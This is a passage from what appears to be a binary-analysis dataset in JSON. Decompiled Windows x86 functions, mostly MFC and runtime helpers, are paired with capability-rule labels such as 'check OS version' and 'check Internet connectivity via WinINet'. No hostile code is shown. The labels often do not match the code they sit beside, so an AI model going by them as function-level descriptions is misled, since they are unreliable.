            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004075ea(code **param_1)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    \n    *param_1 = vtable.AFX_MODULE_THREAD_STATE.0;\n    if (param_1[0xf] != NULL) {\n        (**(*param_1[0xf] + 0x144))();\n    }\n    fcn.00405af2(param_1[0x12]);\n    if (param_1[5] != NULL) {\n        (***param_1[5])(1);\n    }\n    if (param_1[6] != NULL) {\n        (***param_1[6])(1);\n    }\n    if (param_1[7] != NULL) {\n        (***param_1[7])(1);\n    }\n    if (param_1[8] != NULL) {\n        (***param_1[8])(1);\n    }\n    if (param_1[9] != NULL) {\n        (***param_1[9])(1);\n    }\n    pcVar2 = param_1[0xe];\n    if (pcVar2 != NULL) {\n        while (*(pcVar2 + 0xc) != 0) {\n            uVar1 = fcn.0040a00b();\n            fcn.00405af2(uVar1);\n            pcVar2 = param_1[0xe];\n        }\n    }\n    if (param_1[0xc] != NULL) {\n        (**(*param_1[0xc] + 4))(1);\n    }\n    if (param_1[0xd] != NULL) {\n        (**(*param_1[0xd] + 4))(1);\n    }\n    if (param_1[0xe] != NULL) {\n        (**(*param_1[0xe] + 4))(1);\n    }\n    return;\n}\n",
        "token_count": 406
    },
    "0040780f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040780f(code **param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t **ppiVar3;\n    \n    *param_1 = vtable.CDllIsolationWrapperBase.0;\n    if (*(param_1 + 2) != '\\0') {\n        fcn.006fba3c(param_1[1]);\n        return;\n    }\n    ppiVar3 = param_1[3] + -0x10;\n    piVar1 = param_1[3] + -4;\n    LOCK();\n    iVar2 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar2 == 1 || iVar2 + -1 < 0) {\n        (**(**ppiVar3 + 4))(ppiVar3);\n    }\n    return;\n}\n",
        "token_count": 194
    },
    "00407d2f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407d2f(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t in_ECX;\n    \n    iVar1 = fcn.00407ce3();\n    if ((*(iVar1 + 0x7c) == 0) || (*(arg_8h + 0x80) == -1)) {\n        *(in_ECX + 4) = 0;\n    }\n    else {\n        uVar2 = fcn.00407539(*(arg_8h + 0x80));\n        *(in_ECX + 4) = uVar2;\n    }\n    return;\n}\n",
        "token_count": 149
    },
    "00407dd5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00407dd5(uint param_1, uint param_2)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint uVar3;\n    uint32_t unaff_EBX;\n    int32_t unaff_EBP;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x24) != 2) {\n        uVar1 = *(unaff_EBP + -0x1c) == unaff_EBX;\n        if (uVar1 == unaff_EBX) {\n            uVar2 = 0;\n        }\n        else {\n            uVar2 = func_0x004bd91f(param_2);\n        }\n        uVar3 = fcn.00407550();\n        if (uVar1 != unaff_EBX) {\n            func_0x005096ac(uVar3, uVar2);\n        }\n    }\n    return;\n}\n",
        "token_count": 217
    },
    "00407e1d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407e1d(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    \n    piVar1 = fcn.00407e0a();\n    if (piVar1 != NULL) {\n        iVar2 = (**(*piVar1 + 0x128))();\n        if ((iVar2 != 0) && (piVar1[0x20] != NULL)) {\n            (**(*piVar1[0x20] + 100))(arg_8h);\n        }\n    }\n    return;\n}\n",
        "token_count": 127
    },
    "00407e56": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00407e56(int32_t arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint in_ECX;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uint extraout_ECX_01;\n    \n    pcVar2 = *0x42c334;\n    iVar3 = arg_8h;\n    if (arg_8h != 0) goto code_r0x00407e86;\n    iVar3 = fcn.00407d67();\n    in_ECX = extraout_ECX;\n    if ((iVar3 == 0) && (iVar3 = fcn.00407e0a(),  in_ECX = extraout_ECX_00,  iVar3 == 0)) {\n        iVar3 = 0;\n        iVar5 = iVar3;\n        iVar6 = iVar3;\n    }\n    else {\n        iVar3 = *(iVar3 + 0x20);\n        while (iVar5 = iVar3,  iVar6 = iVar3,  iVar3 != 0) {\ncode_r0x00407e86:\n            uVar4 = func_0x004a8364(in_ECX, iVar3, 0xfffffff0);\n            iVar5 = iVar3;\n            iVar6 = iVar3;\n            if ((uVar4 & 0x40000000) == 0) break;\n            iVar3 = (*pcVar2)(iVar3);\n            in_ECX = extraout_ECX_01;\n        }\n    }\n    while (iVar1 = iVar5,  iVar1 != 0) {\n        iVar5 = (*pcVar2)(iVar1);\n        iVar3 = iVar1;\n    }\n    if ((arg_8h == 0) && (iVar6 != 0)) {\n        iVar6 = func_0x004c474e(0, iVar6);\n    }\n    if (arg_ch != NULL) {\n        if (iVar3 != 0) {\n            iVar3 = func_0x0073aa81(iVar3);\n            return iVar3;\n        }\n        *arg_ch = 0;\n    }\n    return iVar6;\n}\n",
        "token_count": 505
    },
    "00407ef6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00407ef6(int32_t arg_8h, uint arg_ch, uint32_t arg_10h, int32_t arg_14h)\n\n{\n    int32_t arg_8h_00;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint arg_8h_01;\n    uint var_11ch;\n    uint var_118h;\n    int32_t var_114h;\n    int32_t var_110h;\n    int32_t var_10ch;\n    uint var_108h;\n    uint32_t var_4h;\n    \n    var_4h = *0x435b90 ^ &stack0xfffffffc;\n    piVar3 = NULL;\n    fcn.00407e1d(0);\n    arg_8h_01 = 0;\n    arg_8h_00 = fcn.00407e56(0, &var_10ch);\n    if (arg_8h_00 != var_10ch) {\n        func_0x00746be5(0, arg_8h_00, 1);\n    }\n    var_114h = 0;\n    uVar1 = func_0x004adbc5(arg_8h_00, arg_8h_00, &var_114h);\n    if (arg_8h_00 != 0) {\n        iVar2 = func_0x00651031(uVar1);\n        if (var_114h == iVar2) {\n            func_0x0067c1e5(arg_8h_00, 0x376, 0, 0);\n            return;\n        }\n    }\n    if (arg_8h != 0) {\n        piVar3 = arg_8h + 0x78;\n    }\n    var_110h = 0;\n    if (piVar3 != NULL) {\n        var_110h = *piVar3;\n        if (arg_14h != 0) {\n            *piVar3 = arg_14h + 0x30000;\n        }\n    }\n    if ((arg_10h & 0xf0) == 0) {\n        if ((arg_10h & 0xf) < 2) {\n            arg_10h = arg_10h | 0x30;\n        }\n        else if ((arg_10h & 0xf) - 3 < 2) {\n            arg_10h = arg_10h | 0x20;\n        }\n    }\n    var_108h._0_1_ = 0;\n    if (arg_8h != 0) {\n        uVar1 = *(arg_8h + 0x50);\n        fcn.00407d73(arg_8h_00, arg_ch, uVar1, arg_10h);\n        if (piVar3 != NULL) {\n            *piVar3 = var_110h;\n        }\n        if (var_10ch != 0) {\n            func_0x00580f7e(uVar1, var_10ch, 1);\n        }\n        fcn.00407e1d(1);\n        fcn.00410f95(arg_8h_01);\n        return;\n    }\n    func_0x006552a5(0, &var_108h, 0x104);\n    return;\n}\n",
        "token_count": 755
    },
    "004080f6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004080f6(int32_t arg_8h)\n\n{\n    if (arg_8h != 0) {\n        fcn.005edd82();\n    }\n    return;\n}\n",
        "token_count": 46
    },
    "004081d7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004081d7(int32_t arg_8h)\n\n{\n    int32_t in_ECX;\n    int32_t extraout_ECX;\n    \n    if (arg_8h == 0) {\n        fcn.00405f96();\n        in_ECX = extraout_ECX;\n    }\n    return *(in_ECX + 4) + arg_8h;\n}\n",
        "token_count": 90
    },
    "0040851e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040851e(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.0041227b(4);\n    if (*(unaff_EBP + 8) != 0) goto code_r0x0040853d;\ncode_r0x00408538:\n    do {\n        fcn.00405f96();\ncode_r0x0040853d:\n        if (*extraout_ECX != 0) goto code_r0x00408578;\n        if (*0x4373b4 == 0) {\n            *(unaff_EBP + -0x10) = 0x4373b8;\n            *(unaff_EBP + -4) = 0;\n            *0x4373b4 = fcn.00408327();\n            *(unaff_EBP + -4) = 0xffffffff;\n            if (*0x4373b4 == 0) goto code_r0x00408538;\n        }\n        iVar1 = fcn.0040820f();\n        *extraout_ECX = iVar1;\n        if (iVar1 != 0) {\ncode_r0x00408578:\n            iVar1 = fcn.0040810c(*extraout_ECX);\n            if (iVar1 == 0) {\n                uVar2 = (**(unaff_EBP + 8))();\n                fcn.004083ce(*extraout_ECX, uVar2);\n            }\n            fcn.00412353();\n            return;\n        }\n    } while( true );\n}\n",
        "token_count": 392
    },
    "00409492": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00409492(uint32_t arg_8h, uint *arg_ch)\n\n{\n    code *pcVar1;\n    uint *puVar2;\n    uint *var_8h;\n    int32_t var_4h;\n    \n    puVar2 = arg_ch;\n    *arg_ch = 1;\n    fcn.00409401(&arg_ch + 3);\n    if (arg_ch._3_1_ == -1) {\n        fcn.0040896d(&arg_8h);\n        if (arg_8h == -2) {\n            *puVar2 = 2;\n            fcn.00409401(&arg_ch + 3);\n            if (arg_ch._3_1_ != -1) goto code_r0x004094b8;\n            fcn.0040896d(&arg_8h);\n        }\n        if (arg_8h < 0xffff) {\n            puVar2 = arg_8h & 0xffff;\n        }\n        else {\n            fcn.004089b5(&arg_ch);\n            puVar2 = arg_ch;\n            if (arg_ch == 0xffffffff) {\n                fcn.00409445(&var_8h);\n                if ((var_4h != 0) || (puVar2 = var_8h,  0x7fffffff < var_8h)) {\n                    fcn.00409921(1, 0);\n                    pcVar1 = swi(3);\n                    puVar2 = (*pcVar1)();\n                    return puVar2;\n                }\n            }\n        }\n    }\n    else {\ncode_r0x004094b8:\n        puVar2 = arg_ch >> 0x18;\n    }\n    return puVar2;\n}\n",
        "token_count": 383
    },
    "00409543": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409543(uint arg_8h, uint32_t arg_ch, int32_t arg_10h)\n\n{\n    if (arg_10h != 0) {\n        fcn.00409382(0xff);\n        fcn.004088f0(0xfffe);\n    }\n    if (arg_ch < 0xff) {\n        fcn.00409382(arg_ch);\n    }\n    else {\n        fcn.00409382(0xff);\n        if (arg_ch < 0xfffe) {\n            fcn.004088f0(arg_ch);\n        }\n        else {\n            fcn.004088f0(0xffff);\n            if (arg_ch == 0xffffffff) {\n                fcn.0040892f(0xffffffff);\n                fcn.004093bd(0xffffffff, 0);\n            }\n            else {\n                fcn.0040892f(arg_ch);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 209
    },
    "004095c7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004095c7(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (arg_8h == 0) {\n        fcn.00405f96();\n    }\n    iVar1 = fcn.00407ce3();\n    fcn.00409999(0);\n    if (*(iVar1 + 0x1c) == NULL) {\n        fcn.00409a0b(0);\n        return 0;\n    }\n    uVar2 = func_0x005558ab(arg_8h, **(iVar1 + 0x1c));\n    return uVar2;\n}\n",
        "token_count": 149
    },
    "00409975": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.00409975(void)\n\n{\n    if (*0x4373ec == 0) {\n        *0x4373ec = 1;\n        fcn.00441e29();\n    }\n    return *0x4373ec;\n}\n",
        "token_count": 58
    },
    "00409999": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409999(uint32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    code *unaff_EBX;\n    \n    if (0x10 < arg_8h) {\n        fcn.00405f96();\n    }\n    if (*0x4373ec == 0) {\n        fcn.00409975();\n    }\n    func_0x0050d6ec(&stack0xfffffffc);\n    piVar1 = arg_8h * 4 + 0x4375a0;\n    if (*piVar1 == 0) {\n        (*unaff_EBX)(0x437588);\n        if (*piVar1 == 0) {\n            iVar2 = arg_8h * 0x18 + 0x4373f0;\n            func_0x007068b4(iVar2, iVar2);\n            *piVar1 = *piVar1 + 1;\n        }\n        func_0x004cb3e0(0x437588);\n        return;\n    }\n    (*unaff_EBX)(arg_8h * 0x18 + 0x4373f0);\n    return;\n}\n",
        "token_count": 266
    },
    "00409a89": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.00409a89(void)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint32_t unaff_EBX;\n    int32_t unaff_EBP;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x24) != 2) {\n        uVar1 = *(unaff_EBP + -0x1c) == unaff_EBX;\n        if (uVar1 == unaff_EBX) {\n            uVar2 = 0;\n        }\n        else {\n            uVar2 = func_0x006f69ff(uVar1);\n        }\n        fcn.00407550();\n        if (uVar1 != unaff_EBX) {\n            func_0x006d8843(uVar2);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 197
    },
    "00409c99": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409c99(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    int32_t in_ECX;\n    \n    if (arg_8h == 0) {\n        arg_8h = 0x11;\n    }\n    if (*(in_ECX + 4) != 0) {\n        fcn.00405af2(*(in_ECX + 4));\n        *(in_ECX + 4) = 0;\n    }\n    if (arg_ch != 0) {\n        uVar1 = fcn.00405ac3(-(arg_8h * 4 >> 0x20 != 0) | arg_8h * 4);\n        *(in_ECX + 4) = uVar1;\n        fcn.00410fb0(uVar1, 0, arg_8h << 2);\n    }\n    *(in_ECX + 8) = arg_8h;\n    return;\n}\n",
        "token_count": 218
    },
    "00409ef4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00409ef4(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    \n    if (*(param_1 + 0x10) == 0) {\n        iVar3 = fcn.0040a846(param_1 + 0x14, *(param_1 + 0x18), 0xc);\n        iVar1 = *(param_1 + 0x18);\n        puVar4 = iVar3 + -8 + iVar1 * 0xc;\n        while (iVar1 = iVar1 + -1,  -1 < iVar1) {\n            *puVar4 = *(param_1 + 0x10);\n            *(param_1 + 0x10) = puVar4;\n            puVar4 = puVar4 + -3;\n        }\n    }\n    puVar4 = *(param_1 + 0x10);\n    uVar2 = *puVar4;\n    *(param_1 + 0xc) = *(param_1 + 0xc) + 1;\n    *(param_1 + 0x10) = uVar2;\n    puVar4[1] = 0;\n    puVar4[2] = 0;\n    return;\n}\n",
        "token_count": 289
    },
    "0040a06f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040a06f(uint noname_0, uint *arg_ch)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    uint unaff_EBP;\n    ulong uVar3;\n    \n    uVar3 = fcn.00407d16();\n    piVar1 = *(uVar3 + 4);\n    if (piVar1 != NULL) {\n    // WARNING: Could not recover jumptable at 0x0040a083. Too many branches\n    // WARNING: Treating indirect jump as call\n        uVar2 = (**(*piVar1 + 0x6c))();\n        return uVar2;\n    }\n    if (arg_ch[1] == 1) {\n        uVar2 = 0xffffffff;\n    }\n    else {\n        if (arg_ch[1] == 0xf) {\n            fcn.00558a7c(uVar3 >> 0x20, *arg_ch, 0, unaff_EBP);\n        }\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 239
    },
    "0040a2a6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a2a6(int32_t *arg_8h, char *arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    int32_t iVar3;\n    char *pcVar4;\n    char *pcVar5;\n    uint var_4h;\n    \n    pcVar4 = arg_ch;\n    if (arg_ch != NULL) goto code_r0x0040a2bb;\n    do {\n        fcn.00405f96();\ncode_r0x0040a2bb:\n    } while (arg_10h == 0);\n    arg_ch = NULL;\n    cVar2 = *pcVar4;\n    pcVar5 = pcVar4;\n    while (cVar2 != '\\0') {\n        if (*pcVar5 == '%') {\n            cVar2 = pcVar5[1];\n            if ((cVar2 < '1') || ('9' < cVar2)) {\n                if ((cVar2 < 'A') || ('Z' < cVar2)) goto code_r0x0040a313;\n                if (cVar2 < ':') goto code_r0x0040a2f3;\n                iVar3 = cVar2 + -0x38;\n            }\n            else {\ncode_r0x0040a2f3:\n                iVar3 = cVar2 + -0x31;\n            }\n            pcVar5 = pcVar5 + 2;\n            if (arg_14h <= iVar3) goto code_r0x0040a326;\n            iVar3 = *(arg_10h + iVar3 * 4);\n            if (iVar3 != 0) {\n                iVar3 = func_0x0058c455(iVar3, iVar3);\n                arg_ch = arg_ch + iVar3;\n            }\n        }\n        else {\ncode_r0x0040a313:\n            iVar3 = fcn.00414c93(*pcVar5);\n            if (iVar3 != 0) {\n                arg_ch = arg_ch + 1;\n                pcVar5 = pcVar5 + 1;\n            }\n            pcVar5 = pcVar5 + 1;\ncode_r0x0040a326:\n            arg_ch = arg_ch + 1;\n        }\n        cVar2 = *pcVar5;\n    }\n    pcVar5 = fcn.00403590(arg_ch);\n    cVar2 = *pcVar4;\n    do {\n        if (cVar2 == '\\0') {\n            fcn.00406bfc(pcVar5 - *arg_8h);\n            return;\n        }\n        if (*pcVar4 == '%') {\n            cVar2 = pcVar4[1];\n            if ((cVar2 < '1') || ('9' < cVar2)) {\n                if ((cVar2 < 'A') || ('Z' < cVar2)) goto code_r0x0040a3af;\n                if (cVar2 < ':') goto code_r0x0040a36c;\n                iVar3 = cVar2 + -0x38;\n            }\n            else {\ncode_r0x0040a36c:\n                iVar3 = cVar2 + -0x31;\n            }\n            pcVar4 = pcVar4 + 2;\n            if (arg_14h <= iVar3) {\n                *pcVar5 = '?';\n                goto code_r0x0040a3cc;\n            }\n            piVar1 = arg_10h + iVar3 * 4;\n            if (*piVar1 != 0) {\n                iVar3 = func_0x006703d3(piVar1, *piVar1);\n                fcn.0040690f(pcVar5, arg_ch + 1, *piVar1);\n                arg_ch = arg_ch - iVar3;\n                pcVar5 = pcVar5 + iVar3;\n            }\n        }\n        else {\ncode_r0x0040a3af:\n            iVar3 = fcn.00414c93(*pcVar4);\n            if (iVar3 != 0) {\n                *pcVar5 = *pcVar4;\n                pcVar5 = pcVar5 + 1;\n                pcVar4 = pcVar4 + 1;\n                arg_ch = arg_ch + -1;\n            }\n            *pcVar5 = *pcVar4;\n            pcVar4 = pcVar4 + 1;\ncode_r0x0040a3cc:\n            pcVar5 = pcVar5 + 1;\n            arg_ch = arg_ch + -1;\n        }\n        cVar2 = *pcVar4;\n    } while( true );\n}\n",
        "token_count": 1017
    },
    "0040a659": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040a659(int32_t param_1)\n\n{\n    if (*(param_1 + 0x50) == 0) {\n        fcn.00679327(*(param_1 + 0x20), 0xfffffff0);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0040a670. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x50) + 0x78))();\n    return;\n}\n",
        "token_count": 122
    },
    "0040a673": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040a673(int32_t param_1)\n\n{\n    if (*(param_1 + 0x50) == 0) {\n        fcn.004e4725(*(param_1 + 0x20), 0xffffffec);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0040a68a. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x50) + 0x7c))();\n    return;\n}\n",
        "token_count": 124
    },
    "0040a68d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040a68d(int32_t param_1)\n\n{\n    if (*(param_1 + 0x50) == 0) {\n        fcn.005dacfd(*(param_1 + 0x20));\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0040a6a2. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(param_1 + 0x50) + 0xa4))();\n    return;\n}\n",
        "token_count": 119
    },
    "0040a6a8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a6a8(uint arg_8h)\n\n{\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x50) == 0) {\n        fcn.007247e9(*(in_ECX + 0x20), arg_8h);\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0040a6c9. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(in_ECX + 0x50) + 0xa8))();\n    return;\n}\n",
        "token_count": 134
    },
    "0040a6ea": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a6ea(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x50) == 0) {\n        fcn.006985cd();\n        return;\n    }\n    // WARNING: Could not recover jumptable at 0x0040a722. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**(**(in_ECX + 0x50) + 0x9c))();\n    return;\n}\n",
        "token_count": 147
    },
    "0040a728": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a728(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    int32_t iVar1;\n    int32_t in_ECX;\n    \n    if ((in_ECX != 0) && (*(in_ECX + 0x50) == 0)) {\n        arg_8h_00 = (**0x42c334)(*(in_ECX + 0x20));\n        iVar1 = fcn.00409d7d(arg_8h_00);\n        if ((iVar1 != 0) && (*(iVar1 + 0x4c) != 0)) {\n            (**(**(iVar1 + 0x4c) + 0x9c))();\n        }\n    }\n    return;\n}\n",
        "token_count": 167
    },
    "0040a7a6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
